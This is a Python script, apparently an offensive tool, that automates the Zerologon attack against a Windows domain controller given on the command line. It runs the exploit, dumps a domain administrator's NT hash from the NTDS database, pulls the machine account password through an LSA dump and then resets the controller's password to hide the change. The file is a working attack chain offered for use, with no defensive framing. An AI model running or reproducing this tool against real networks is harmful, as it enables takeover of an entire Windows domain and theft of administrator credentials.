# Usage:
# python3 zerologon-Shot.py xiaoli-2008.com/"WIN-D6SJTQG7I0K$"@192.168.85.210 (need dollar sign)

import argparse

from binascii import unhexlify
from lib.exploit import zerologon
from lib.secretsdump_nano import dump
from lib.restorepassword import ChangeMachinePassword
from impacket.examples.utils import parse_target

class wrapper():
    def __init__(self, username, dc_ip, domain, kdcHost):
        self.dc = username
        self.dc_ip = dc_ip
        self.domain = domain
        self.kdcHost = kdcHost

    def pwn(self):
        # Zerologon exploit
        exploit = zerologon(self.dc_ip, self.dc.rstrip('$'))
        exploit.perform_attack()

        # LDAP query first enabled domain admins
        #ldapquery = LDAPQuery(self.domain, self.dc)
        #domain_Admin = ldapquery.getFirstDomainAdmins()
        #print(domain_Admin)
        
        # Dump first domain admin nthash
        secretsdump = dump(dc_ip=self.dc_ip, dc=self.dc, domain=self.domain, kdcHost=self.kdcHost)
        username, nthash = secretsdump.NTDSDump_BlankPass()
        
        # Get Machine account hexpass
        secretsdump = dump(dc_ip=self.dc_ip, dc=self.dc, domain=self.domain, kdcHost=self.kdcHost)
        hexpass = secretsdump.LSADump(username=username, nthash=nthash)

        # Restore machine account password
        action = ChangeMachinePassword(username=self.dc, password=unhexlify(hexpass.strip("\r\n")))
        action.dump(remoteName=self.dc.rstrip('$'), remoteHost=self.dc_ip)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description="Zerologon with restore DC password automatically.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-target-ip', metavar = "ip address", action='store', help='IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it')

    options = parser.parse_args()

    domain, username, password, address = parse_target(options.target)

    executer = wrapper(username, address, domain, options.target_ip)
    executer.pwn()